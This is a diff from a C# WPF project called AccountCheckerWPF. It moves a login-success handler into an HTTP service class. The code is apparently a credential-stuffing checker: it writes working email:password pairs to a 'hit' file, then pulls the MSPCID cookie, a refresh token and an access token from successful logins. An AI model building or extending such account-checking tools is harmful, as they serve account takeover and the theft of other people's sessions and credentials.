@@ -263,7 +263,7 @@ namespace AccountCheckerWPF
                 case LoginKeyCheckStatus.Success:
                     _success++;
                     await _hitFileWriter.WriteLineAsync($"{email}:{password} - Success");
-                    await HandleLoginSuccessResponse(postResponse, cookies);
+                    await _httpServices.HandleLoginSuccessResponse(postResponse, cookies);
                     return RetryStatus.Done;
 
                 case LoginKeyCheckStatus.Identity:
@@ -274,22 +274,6 @@ namespace AccountCheckerWPF
 
                 default:
                     return RetryStatus.Done;
-            }
-        }
-
-        private async Task HandleLoginSuccessResponse(HttpResponseMessage postResponse, List<string> cookies)
-        {
-            var cid = CommonHelper.GetCookieValue("MSPCID", cookies)?.ToUpper();
-
-            var address = postResponse.RequestMessage.RequestUri.ToString();
-            var refreshToken = CommonHelper.ExtractValueBetween(address, "refresh_token=", "&");
-
-            if (refreshToken != null)
-            {
-                var getAccessTokenResponse = await _httpServices.SendPostRequestToGetAccessTokenAsync(refreshToken);
-                var getAccessTokenResponseBody = await getAccessTokenResponse.Content.ReadAsStringAsync();
-                var json = JObject.Parse(getAccessTokenResponseBody);
-                var accessToken = json["access_token"];
             }
         }
     }
